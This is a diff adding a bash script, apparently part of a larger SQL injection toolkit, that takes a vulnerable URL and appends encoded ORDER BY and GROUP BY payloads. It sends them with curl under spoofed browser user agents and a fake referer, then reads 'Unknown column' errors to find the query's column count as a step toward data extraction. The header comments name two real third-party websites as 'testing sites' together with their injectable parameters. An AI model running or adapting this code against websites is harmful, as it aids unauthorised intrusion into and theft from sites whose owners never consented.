@@ -1,0 +1,196 @@
+#!/bin/bash
+# Order BY GROUP BY Column Count Checker Script
+# By HR
+
+#TESTING SITES:
+# http://www.drewapenaar.nl/project.php?id=67 		(STRAIGHT ORDER BY 6)
+# http://www.reproductivechoices.co.za/index.php?id=18	(STRING ORDER BY 9)
+
+GATE=0
+OCHK1=$(mktemp -p "$JUNK" -t foooooOchk1.tmp.XXX)
+OCHK2=$(mktemp -p "$JUNK" -t foooooOchk2.tmp.XXX)
+uagent1="Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00"
+uagent2="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1"
+uagent3="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"
+uagent4="Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0"
+
+order_type(){
+	ORDERBY=$(echo "$sitetargets" | sed "s/$/%20OrDeR%20By%20$ORDERCOUNT--/");
+	SORDERBY=$(echo "$sitetargets" | sed "s/$/%27%20OrDeR%20By%20$ORDERCOUNT--+-/");
+	GROUPBY=$(echo "$sitetargets" | sed "s/$/%20GrOuP%20bY%20$ORDERCOUNT--/");
+	SGROUPBY=$(echo "$sitetargets" | sed "s/$/%27%20GrOuP%20bY%20$ORDERCOUNT--+-/");
+	if [ "$METH" == 1 ]; then 
+		OMETH="$SGROUPBY"
+	fi
+	if [ "$METH" == 2 ]; then 
+		OMETH="$GROUPBY"
+	fi
+	if [ "$METH" == 3 ]; then 
+		OMETH="$SORDERBY"
+	fi
+	if [ "$METH" == 4 ]; then 
+		OMETH="$ORDERBY"
+	fi
+
+}
+
+#Start off our initial request to site using base LINK and straight ORDER BY 1000 request and send off to regex section to determine method for continue
+order_by1(){
+	echo
+	echo "Testing for column count method..." | grep --color 'Testing for column count method'
+	echo
+	curl "$ORDERBY" --ssl --retry 1 --retry-delay 3 --connect-timeout 2 --no-keepalive -s -e "http://www.yahoo.com/q?=order" -A "$uagent2" -o "$OCHK1"
+	grep -i 'Unknown column' "$OCHK1" 2> /dev/null 2>&1
+	#Check for "Unknown Column" in results indicating clean injection, but need to reduce. Otherwise we switch to String based to check there...
+	if [ "$?" != 0 ]; then
+		curl "$SORDERBY" --ssl --retry 1 --retry-delay 3 --connect-timeout 2 --no-keepalive -s -e "http://www.yahoo.com/q?=order" -A "$uagent4" -o "$OCHK2"
+		grep -i 'Unknown column' "$OCHK2" 2> /dev/null 2>&1
+		if [ "$?" != 0 ]; then
+			curl "$GROUPBY" --ssl --retry 1 --retry-delay 3 --connect-timeout 2 --no-keepalive -s -e "http://www.yahoo.com/q?=order" -A "$uagent1" -o "$OCHK1"
+			grep -i 'Unknown column' "$OCHK1" 2> /dev/null 2>&1
+			if [ "$?" != 0 ]; then
+				curl "$SGROUPBY" --ssl --retry 1 --retry-delay 3 --connect-timeout 2 --no-keepalive -s -e "http://www.yahoo.com/q?=order" -A "$uagent3" -o "$OCHK2"
+				grep -i 'Unknown column' "$OCHK2" 2> /dev/null 2>&1
+				if [ "$?" != 0 ]; then
+					echo
+					echo "Cant seem to find column count or its over 1000 columns. Please inspect manually to be sure...." | grep --color -E 'Cant seem to find column count or its over 1000 columns||Please inspect manually to be sure'
+					echo
+					exit 0; 
+				fi
+				echo "Using String Based GROUP BY Method...." | grep --color 'Using String Based GROUP BY Method'
+				ORDERCOUNT=$(expr $ORDERCOUNT - 950)
+				order_type
+				METH=1;
+				order_by2
+			fi
+			echo "Using GROUP BY Method...." | grep --color 'Using GROUP BY Method'
+			ORDERCOUNT=$(expr $ORDERCOUNT - 950)
+			METH=2;
+			order_by2
+		fi
+		echo "Using String Based ORDER BY Method...." | grep --color 'Using String Based ORDER BY Method'
+		ORDERCOUNT=$(expr $ORDERCOUNT - 950)
+		METH=3;
+		order_by2
+	fi
+	echo "Using ORDER BY Method...." | grep --color 'Using ORDER BY Method'
+	ORDERCOUNT=$(expr $ORDERCOUNT - 950)
+	METH=4;
+	order_by2
+}
+
+oface(){
+	oface=1 #preset before looping ;)
+	while [ "$oface" != 0 ]; do
+		order_type
+		curl "$OMETH" --ssl --retry 1 --retry-delay 3 --connect-timeout 2 --no-keepalive -s -e "http://www.yahoo.com/q?=order" -A "$UA" -o "$OCHK1"
+		grep -i 'Unknown column' "$OCHK1" 2> /dev/null 2>&1
+		if [ "$?" != 0 ]; then
+			oface=0
+			echo
+			echo "Column Count is: $ORDERCOUNT" | grep --color 'Column Count is'
+			echo
+			sqli_banner
+			sqli_core;
+		fi
+		ORDERCOUNT=$(expr $ORDERCOUNT - 1) #and run down till we find it...,N-1 where N=whatever the order count was when we enter this function
+		oface=1
+		if [ "$ORDERCOUNT" == 0 ]; then
+			echo
+			echo "Sorry, looks like we were not able to find the column count for you, maybe next time...." | grep --color -E 'Sorry||looks like we were not able to find the column count for you||maybe next time'
+			echo
+			sqli_banner
+			sqli_core;
+		fi
+	done
+	#If we break the loop we have found column count :)
+	echo
+	echo "Column Count is: $ORDERCOUNT" | grep --color 'Column Count is'
+	echo
+	exit 0;
+}
+
+order_by2(){
+	#Should be entering with a count of 50, drop to 10 and work up or down from there (were only catching small stuff here)....
+	echo
+	echo "Finding column count now..." | grep --color 'Finding column count now'
+	echo
+	#50
+	order_type
+	curl "$OMETH" --ssl --retry 1 --retry-delay 3 --connect-timeout 2 --no-keepalive -s -e "http://www.yahoo.com/q?=order" -A "$uagent1" -o "$OCHK1"
+	grep -i 'Unknown column' "$OCHK1" 2> /dev/null 2>&1
+	if [ "$?" != 0 ]; then
+		echo
+		echo "It would seem the column count is higher than 50 which is more than I am built to handle currently. Please double-check manually to confirm or deny...." | grep --color -E 'It would seem the column count is higher than 50 which is more than I am built to handle currently||Please double||check manually to confirm or deny'
+		echo
+		exit 0;
+	fi
+	ORDERCOUNT=$(expr $ORDERCOUNT - 40)
+	while [ "$ORDERCOUNT" -gt 0 ]; do
+		#10 and re-check
+		order_type
+		curl "$OMETH" --ssl --retry 1 --retry-delay 3 --connect-timeout 2 --no-keepalive -s -e "http://www.yahoo.com/q?=order" -A "$uagent2" -o "$OCHK1"
+		grep -i 'Unknown column' "$OCHK1" 2> /dev/null 2>&1
+		if [ "$?" != 0 ]; then
+			echo
+			echo "It would seem the column count is higher than $ORDERCOUNT, need to go back up..." | grep --color -E 'It would seem the column count is higher than||need to go back up'
+			echo
+			ORDERCOUNT=$(expr $ORDERCOUNT + 15) #25
+			#25 and re-check
+			order_type
+			curl "$OMETH" --ssl --retry 1 --retry-delay 3 --connect-timeout 2 --no-keepalive -s -e "http://www.yahoo.com/q?=order" -A "$uagent2" -o "$OCHK1"
+			grep -i 'Unknown column' "$OCHK1" 2> /dev/null 2>&1
+			if [ "$?" != 0 ]; then
+				echo
+				echo "It would seem the column count is higher than $ORDERCOUNT, need to go back up..." | grep --color -E 'It would seem the column count is higher than||need to go back up'
+				echo
+				ORDERCOUNT=$(expr $ORDERCOUNT + 10) #35
+				#35 and recheck
+				order_type
+				curl "$OMETH" --ssl --retry 1 --retry-delay 3 --connect-timeout 2 --no-keepalive -s -e "http://www.yahoo.com/q?=order" -A "$uagent3" -o "$OCHK1"
+				grep -i 'Unknown column' "$OCHK1" 2> /dev/null 2>&1
+				if [ "$?" != 0 ]; then
+					echo
+					echo "It would seem the column count is higher than $ORDERCOUNT, need to go back up..." | grep --color -E 'It would seem the column count is higher than||need to go back up'
+					echo
+					ORDERCOUNT=$(expr $ORDERCOUNT + 14) #49
+					#49 and recheck
+					order_type
+					curl "$OMETH" --ssl --retry 1 --retry-delay 3 --connect-timeout 2 --no-keepalive -s -e "http://www.yahoo.com/q?=order" -A "$uagent4" -o "$OCHK1"
+					grep -i 'Unknown column' "$OCHK1" 2> /dev/null 2>&1
+					if [ "$?" != 0 ]; then
+						UA="$uagent1"
+						oface
+					fi
+					#If we hit this we messed up somewhere since we start by kicking anything over 50 :(
+					exit 0;
+				fi
+				UA="$uagent2"
+				oface
+			fi
+			UA="$uagent3"
+			oface
+		fi
+		UA="$uagent4"
+		oface
+	done
+	exit 0;
+}
+
+#MAIN
+echo
+echo "Please provide the vuln link to see if we can find column count: " | grep --color 'Please provide the vuln link to see if we can find column count'
+read SQLiCOLCOUNTTARGET
+echo
+sitetargets="$SQLiCOLCOUNTTARGET"
+ORDERCOUNT=1000;
+ORDERBY=$(echo "$sitetargets" | sed "s/$/%20OrDeR%20By%20$ORDERCOUNT--/");
+SORDERBY=$(echo "$sitetargets" | sed "s/$/%27%20OrDeR%20By%20$ORDERCOUNT--+-/");
+GROUPBY=$(echo "$sitetargets" | sed "s/$/%20GrOuP%20bY%20$ORDERCOUNT--/");
+SGROUPBY=$(echo "$sitetargets" | sed "s/$/%27%20GrOuP%20bY%20$ORDERCOUNT--+-/");
+order_by1
+
+
+rm -rf "$OCHK1"
+rm -rf "$OCHK2"
+#EOF
